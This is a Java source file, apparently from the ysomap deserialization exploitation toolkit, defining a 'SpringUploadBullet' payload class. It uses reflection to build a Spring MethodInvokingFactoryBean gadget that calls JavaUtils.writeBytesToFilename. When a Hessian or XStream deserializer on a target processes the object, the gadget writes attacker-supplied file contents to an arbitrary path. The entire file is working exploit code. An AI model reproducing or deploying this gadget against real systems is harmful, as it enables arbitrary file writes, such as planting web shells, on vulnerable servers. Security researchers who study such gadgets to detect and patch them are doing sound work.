package ysomap.bullets.spring;

import com.sun.org.apache.xml.internal.security.utils.JavaUtils;
import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import ysomap.common.annotation.*;
import ysomap.core.util.FileHelper;
import ysomap.core.util.ReflectionHelper;

import java.lang.reflect.Method;

/**
 * @author wh1t3p1g
 * @since 2022/5/16
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("任意函数调用")
@Targets({Targets.HESSIAN, Targets.XSTREAM})
@Dependencies({"org.springframework:spring-context"})
public class SpringUploadBullet extends SpringExecBullet {

    @NotNull
    @Require(name = "filepath", detail = "/tmp/test")
    public String filepath;

    @NotNull
    @Require(name = "localFile", detail = "/tmp/test")
    public String localFile;

    private String beanName = "ysomap";
    private byte[] data = null;

    public Object makeBean() throws Exception {
        if(data == null){
            data = FileHelper.fileGetContent(localFile);
        }
        MethodInvokingFactoryBean bean = new MethodInvokingFactoryBean();
        bean.setSingleton(false);
        Class<?> cls = JavaUtils.class;
        bean.setTargetObject(cls);
        Method method = cls.getMethod("writeBytesToFilename", String.class, byte[].class);
        ReflectionHelper.setFieldValue(bean, "methodObject", method);
        ReflectionHelper.setFieldValue(bean, "beanClassLoader", null);
        bean.setArguments(filepath, data);
        return bean;
    }

    public static SpringUploadBullet newInstance(Object... args) throws Exception {
        SpringUploadBullet bullet = new SpringUploadBullet();
        bullet.set("filepath", args[0]);
        bullet.set("localFile", args[1]);
        return bullet;
    }
}
